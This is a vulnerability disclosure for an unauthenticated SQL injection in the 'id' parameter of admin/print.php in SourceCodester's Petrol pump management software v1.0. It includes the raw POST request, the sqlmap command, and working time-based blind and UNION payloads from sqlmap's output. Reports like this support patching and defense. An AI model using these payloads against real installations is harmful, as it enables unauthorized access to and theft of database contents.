### Source code

[Petrol pump management software free download | SourceCodester](https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html)



### Description

SQL Injection vulnerability in sourcecodester Petrol pump management software v1.0, A vulnerability has been found that is rated as high risk, affecting some unknown functionality of the admin\print.php file, Using parameter id to construct malicious SQL statements to obtain sensitive information, thus causing harm



### Analysis vulnerability

`admin\print.php`

![image-20241023155634643](assets/image-20241023155634643.png)

Here, the user input `$_POST['id']` is concatenated into the SQL query statement, which is obviously susceptible to SQL injection attacks



### Recurrent vulnerability

![image-20241023160251059](assets/image-20241023160251059.png)

```
POST /admin/print.php HTTP/1.1
Host: 10.151.167.168:6677
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie:
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

id=1*
```

Save the packet and use sqlmap attack

```
payload：
python3 sqlmap.py --random-agent --batch -r data.txt --risk 3 --dbs
```

![image-20241023160627277](assets/image-20241023160627277.png)

```
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 8405 FROM (SELECT(SLEEP(5)))RBvx) AND 'WWQR'='WWQR

    Type: UNION query
    Title: Generic UNION query (NULL) - 16 columns
    Payload: id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171706271,0x744d4a644a516944425443614f4c594948754b4a746356615251435951444f72597a74534274424a,0x71706a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
```

Look at the packet, I did not add a cookie value, indicating that no authentication does not need to log in to remotely launch attacks

You can see that this payload utilizes two injection methods, time-based blind and UNION query, and successfully injects the database name